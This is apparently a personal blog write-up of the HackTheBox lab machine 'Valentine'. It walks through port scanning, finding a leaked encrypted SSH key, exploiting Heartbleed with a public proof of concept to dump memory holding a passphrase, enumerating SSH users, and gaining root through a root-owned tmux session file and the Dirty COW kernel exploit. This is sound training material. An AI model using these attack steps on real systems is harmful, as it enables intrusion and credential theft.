---
title: "Valentine"
date: 2023-08-29T20:29:34+02:00
tags: ["privesc","web","linux","ssh"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with ssh private key leak and a heartbleed vuln. We are able to privEsc thanks to a SUID tmux session file. Other way to privEsc is taking advatage of the unpatched kernel version."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Valentine
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Valentine

![Untitled](/HTB/valentine-icon.png)

## Tools Used

- nmap
- searchsploit
- ssh

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```perl
  36   │ PORT    STATE SERVICE  REASON         VERSION
  37   │ 22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10
       │ (Ubuntu Linux; protocol 2.0)
  38   │ | ssh-hostkey:
  39   │ |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
  40   │ | ssh-dss AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi+474hX6L
       │ HkDgC9dzcvEGyMB/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/ROm82p0JasEdg1z
       │ 6QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA
       │ 5vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8
       │ CPRkwyPdi/hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5Q
       │ REuRbGFM6DATJJFkg+PXG/OsLsba/BP8UfcuPM+WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoR
       │ fGqzi+3ndUCo9/m+T18pn+ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaM
       │ cYOsFqO841K0O90BV8DhyU4JYBjcpslT+A2X+ahj2QJVGqZJSlusNAQ9vplWxofFONa+IUS
       │ Gl1UsGjY0QGsA5l5ohfQ==
  41   │ |   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
  42   │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up+q0NriI
       │ 5g5xAs1+0gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR
       │ 8sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo+KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPP
       │ M7929EoovpooSjwPfqvEhRMtq+KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic+Y0KWKa9q
       │ deBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZU
       │ ADy8A6tbfSgopaeR2UN4QRgM1dX
  43   │ |   256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
  44   │ |_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAA
       │ ABBBJ+pCNI5Xv8P96CmyDi/EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl+LEiKQe
       │ e5RRw9d+lgH3Fm5O9XI=
  45   │ 80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
  46   │ |_http-title: Site doesn't have a title (text/html).
  47   │ |_http-server-header: Apache/2.2.22 (Ubuntu)
  48   │ | http-methods:
  49   │ |_  Supported Methods: GET HEAD POST OPTIONS
  50   │ 443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
  51   │ |_ssl-date: 2023-08-29T08:05:22+00:00; -7s from scanner time.
  52   │ |_http-server-header: Apache/2.2.22 (Ubuntu)
  53   │ | http-methods:
  54   │ |_  Supported Methods: GET HEAD POST OPTIONS
  55   │ |_http-title: Site doesn't have a title (text/html).
  56   │ | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentin
       │ e.htb/stateOrProvinceName=FL/countryName=US
  57   │ | Issuer: commonName=valentine.htb/organizationName=valentine.htb/state
       │ OrProvinceName=FL/countryName=US
  58   │ | Public Key type: rsa
  59   │ | Public Key bits: 2048
  60   │ | Signature Algorithm: sha1WithRSAEncryption
  61   │ | Not valid before: 2018-02-06T00:45:25
  62   │ | Not valid after:  2019-02-06T00:45:25
  63   │ | MD5:   a413:c4f0:b145:2154:fb54:b2de:c7a9:809d
  64   │ | SHA-1: 2303:80da:60e7:bde7:2ba6:76dd:5214:3c3c:6f53:01b1
  65   │ | -----BEGIN CERTIFICATE-----
  66   │ | MIIDZzCCAk+gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV
  67   │ | BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG
  68   │ | A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1
  69   │ | MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50
  70   │ | aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB
  71   │ | BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo/znkcGfT7SPrTLzNrb8ic+aO/GWao
  72   │ | oY35ImIO4Z5FUB9ZL6y6lc+vI6pUyWRADyWoxd3LxByHDNJzEi53ds+JSPs5SuH1
  73   │ | PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx+39vsFiK6ywcrepvvFZndGKXVg
  74   │ | 0K+R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6
  75   │ | 4DFNQybOsJHm0JtI2M9PefmvEkTUZeT/d0dWhU076a3bTestKZf4WpqZw60XGmxz
  76   │ | pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O
  77   │ | BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy
  78   │ | fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7
  79   │ | cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU+N
  80   │ | XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc+x+91GWYNQvvdnFLO
  81   │ | 5CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S
  82   │ | q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP
  83   │ | csAwIHShdX+Jd8E5oty5C07FJrzVtW+Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa
  84   │ | gRSFfyZx/VqBh9c=
  85   │ |_-----END CERTIFICATE-----
  86   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see three open ports one for **ssh** and two for **web services**.

## Enumeration

Let’s start enumerating the ssl webpage.

![Untitled](/HTB/valentine-1.png)

We can see a picture as always I used **exiftool**, **steghide** and **strings** in order to see some interesting data but nothing useful.

Fuzzing the page I found the next directories

```bash
ffuf -u http://10.10.10.43/FUZZ -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -c -o fuzz | tee fuzz.save
```

```bash
  61   │ [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 109ms]
  62   │ | URL | http://10.10.10.79/dev
  63   │ | --> | http://10.10.10.79/dev/
  64   │     * FUZZ: dev
  65   │
  66   │ [Status: 200, Size: 554, Words: 73, Lines: 28, Duration: 113ms]
  67   │ | URL | http://10.10.10.79/encode
  68   │     * FUZZ: encode
  69   │
  70   │ [Status: 200, Size: 552, Words: 73, Lines: 26, Duration: 131ms]
  71   │ | URL | http://10.10.10.79/decode
  72   │     * FUZZ: decode
  73   │
  74   │ [Status: 200, Size: 153356, Words: 627, Lines: 620, Duration: 116ms]
  75   │ | URL | http://10.10.10.79/omg
  76   │     * FUZZ: omg
  77   │
  78   │ [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 96ms]
  79   │ | URL | http://10.10.10.79/server-status
  80   │     * FUZZ: server-status
```

When we try to access to `/dev` we can two files.

![Untitled](/HTB/valentine-2.png)

![Untitled](/HTB/valentine-3.png)

**hype_key** seems to be information in hexadecimal.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Decoding the data we get an **id_rsa** but seems to be encrypted.

I tried to crack the password with **ssh2john** but failed.

```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

**notes.txt** leaks some instructions for the developer.

Now let’s take a look at the **encode/decode** directories.

![Untitled](/HTB/valentine-4.png)

![Untitled](/HTB/valentine-6.png)

As we can see is only a clientside base64 encoder/decoder.

`/omg` is only the homepage’s picture directory so there is nothing we can do at this point

After navigating through each directory of the ssl webiste I accesed to the **http** website but I realized that is a copy of the **ssl** one.

## Exploiting

If we return to nmap and perform a vuln scan.

```bash
nmap $IP -p22,80,443 --script="safe and vuln" 
```

```perl
   5   │ PORT    STATE SERVICE
   6   │ 22/tcp  open  ssh
   7   │ 80/tcp  open  http
   8   │ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
   9   │ 443/tcp open  https
  10   │ | ssl-poodle:
  11   │ |   VULNERABLE:
  12   │ |   SSL POODLE information leak
  13   │ |     State: VULNERABLE
  14   │ |     IDs:  BID:70574  CVE:CVE-2014-3566
  15   │ |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
  16   │ |           products, uses nondeterministic CBC padding, which makes it easier
  17   │ |           for man-in-the-middle attackers to obtain cleartext data via a
  18   │ |           padding-oracle attack, aka the "POODLE" issue.
  19   │ |     Disclosure date: 2014-10-14
  20   │ |     Check results:
  21   │ |       TLS_RSA_WITH_AES_128_CBC_SHA
  22   │ |     References:
  23   │ |       https://www.imperialviolet.org/2014/10/14/poodle.html
  24   │ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
  25   │ |       https://www.securityfocus.com/bid/70574
  26   │ |_      https://www.openssl.org/~bodo/ssl-poodle.pdf
  27   │ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
  28   │ | ssl-ccs-injection:
  29   │ |   VULNERABLE:
  30   │ |   SSL/TLS MITM vulnerability (CCS Injection)
  31   │ |     State: VULNERABLE
  32   │ |     Risk factor: High
  33   │ |       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
  34   │ |       does not properly restrict processing of ChangeCipherSpec messages,
  35   │ |       which allows man-in-the-middle attackers to trigger use of a zero
  36   │ |       length master key in certain OpenSSL-to-OpenSSL communications, and
  37   │ |       consequently hijack sessions or obtain sensitive information, via
  38   │ |       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
  39   │ |
  40   │ |     References:
  41   │ |       http://www.openssl.org/news/secadv_20140605.txt
  42   │ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
  43   │ |_      http://www.cvedetails.com/cve/2014-0224
  44   │ | ssl-heartbleed:
  45   │ |   VULNERABLE:
  46   │ |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
  47   │ |     State: VULNERABLE
  48   │ |     Risk factor: High
  49   │ |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the
       │ vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
  50   │ |
  51   │ |     References:
  52   │ |       http://www.openssl.org/news/secadv_20140407.txt
  53   │ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
  54   │ |_      http://cvedetails.com/cve/2014-0160/
  55   │
```

We can observe that there are some vulnerabilities associated with the **ssl** website. 

One especially called my attention, checking the scan we can see that is vulnerable to **heartbleed**. This make sense because if we take a look at the homepage’s picture the heart bleeding gives us an clue of that vulnerability.

**Heartbleed** vuln is a security bug in some outdated versions of the **OpenSSL** cryptography library, which is a widely used implementation of the **Transport Layer Security protocol**. The vulnerability was classified as a buffer over-read, a situation where more data can be read than should be allowed.

![Untitled](/HTB/valentine-5.png)

Googling we can find a **github** [exploit](https://github.com/mpgn/heartbleed-PoC) which fits well.

```bash
python2 heartbleed-exploit.py 10.10.10.79
```

Executing the exploit, the exploit start by sending the handshake and after that send a crafted **heartbleed** request and the server answer with the data leak is outputted in a file called out.txt

Once executed we retrieve the following data

```
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 3F  mV0aGVoeXBlCg==?
  0160: 23 66 17 BF 98 D1 4E C4 D9 A3 DE 86 47 94 A6 26  #f....N.....G..&
  0170: 38 38 88 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  88..............
  0180: 00 7E 00 00 00 00 00 00 00 00 00 00 00 00 00 00  .~..............
  0200: 31 33 30 38 41 46 42 35 35 32 41 42 39 34 34 37  1308AFB552AB9447
  0210: 43 31 31 46 39 32 42 31 34 30 42 45 44 38 41 46  C11F92B140BED8AF
  0220: 43 32 38 36 38 37 41 36 36 32 37 45 45 32 30 35  C28687A6627EE205
  0230: 42 42 30 37 32 38 36 43 42 31 41 31 46 38 35 46  BB07286CB1A1F85F
  0240: 30 41 38 45 42 39 39 39 35 46 44 35 44 33 32 30  0A8EB9995FD5D320
  0250: 44 39 35 44 45 44 37 30 32 32 43 44 34 36 34 22  D95DED7022CD464"
  0260: 3E 6D 61 63 2D 69 6E 74 65 6C 3C 2F 64 65 76 69  >mac-intel</devi
  0270: 63 65 2D 69 64 3E 0A 3C 6D 61 63 2D 61 64 64 72  ce-id>.<mac-addr
  0280: 65 73 73 2D 6C 69 73 74 3E 0A 3C 6D 61 63 2D 61  ess-list>.<mac-a
  0290: 64 64 72 65 73 73 3E 31 33 3A 39 30 3A 65 38 3A  ddress>13:90:e8:
  02a0: 61 34 3A 63 35 3A 32 30 3C 2F 6D 61 63 2D 61 64  a4:c5:20</mac-ad
  02b0: 64 72 65 73 73 3E 3C 2F 6D 61 63 2D 61 64 64 72  dress></mac-addr
  02c0: 65 73 73 2D 6C 69 73 74 3E 0A 3C 67 72 6F 75 70  ess-list>.<group
  02d0: 2D 73 65 6C 65 63 74 3E 56 50 4E 3C 2F 67 72 6F  -select>VPN</gro
  02e0: 75 70 2D 73 65 6C 65 63 74 3E 0A 3C 67 72 6F 75  up-select>.<grou
  02f0: 70 2D 61 63 63 65 73 73 3E 68 74 74 70 73 3A 2F  p-access>https:/
  0300: 2F 31 30 2E 31 30 2E 31 30 2E 37 39 3A 34 34 33  /10.10.10.79:443
  0310: 3C 2F 67 72 6F 75 70 2D 61 63 63 65 73 73 3E 0A  </group-access>.
  0320: 3C 2F 63 6F 6E 66 69 67 2D 61 75 74 68 3E 74 58  </config-auth>tX
  0330: F0 64 BF F5 03 D7 23 28 D7 34 DB 44 83 AE 38 82  .d....#(.4.D..8.
  0340: 03 5A 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D  .Z..............
  1f60: 71 A4 07 00 00 00 00 00 00 00 00 00 00 00 00 00  q...............
```

If we observe the output we can see a text variable with **base64** encoded text 

```
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Decoding the output we have the following text

```
heartbleedbelievethehype
```

We have something but we don’t know what we can do with this phrase.

The first thing that came to my mind was maybe is a password for the **id_rsa** but we don’t have any users by the way.

As the ssh version is so older maybe there is some exploit which help us to enumerate ssh usernames.

![Untitled](/HTB/valentine-7.png)

There is a bunch of them that fits so well. The one that I have selected waits for an username argument and tell us if it’s a valid username or not.

```bash
sshenum.py [-h] [-p PORT] target username
```

I have tried the default ones and some ones like **heatbleed** or **hype** since they compose the previously decoded text.

![Untitled](/HTB/valentine-8.png)

![Untitled](/HTB/valentine-9.png)

**root** and **hype** are the only valid ones.

## Gaining an Initial Foothold

I tried to access to each one using the decoded text as password and it works for **hype**.

![Untitled](/HTB/valentine-10.png)

As we are logged as **hype**, let’s cat the **user’s flag**

![Untitled](/HTB/valentine-11.png)

## Escalating Privilege

### First Way

In order to **privEsc** I first go to see if there is some **SUID** files but nothing is useful, then I used **moniProc.sh** which is a bash script which I used in a lot of writeups, but only gets one cronjob which is executing a bash script on the roots directory so we can do nothing at this point.

As we don’t have the hype’s password we can’t exploit **sudoers** vulns.

Checking at the hype’s home directory we can see that the **.bash_history** file is not empty.

```bash
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess
tmux a -t dev_sess
tmux --help
tmux -S /.devs/dev_sess
exit
```

The history shows the use of **tmux** opening a session file and if we check the file’s permissions the file seems to be a **SUID** file and the owner is the **root** user but the group owner is **hype** so we can execute it.

![Untitled](/HTB/valentine-12.png)

So let’s try to open the session file with **tmux**.

```bash
tmux -S /.devs/dev_sess
```

![Untitled](/HTB/valentine-13.png)

We have pwnd the system.

Let’s cat the **root’s flag**.

![Untitled](/HTB/valentine-14.png)

### Second Way

There is other unintentional way to **privEsc**

![Untitled](/HTB/valentine-15.png)

If we check the **kernel version** we can see that is so outdated.

![Untitled](/HTB/valentine-16.png)

In this situations dirtycow is the fastest solution to help to **privEsc**. This vuln take advantage of race condition to write on the `/etc/passwd.` 

The exploit which I am going to use creates a username called **firefart** with the password of your choice with **root** id.

First if we take a look on the code we can find how to compile the file.

```bash
gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt
```

Once compiled, I send the exploit via wget and a python server in order to execute it in the remote machine.

Now let’s execute it, in this case I set **firefart password** as `password`**.**

```bash
su firefart
```

Once logged as firefart we are able to see the **flag** at the **root’s** directory.

**Thank you for reading, and happy hacking! 😄**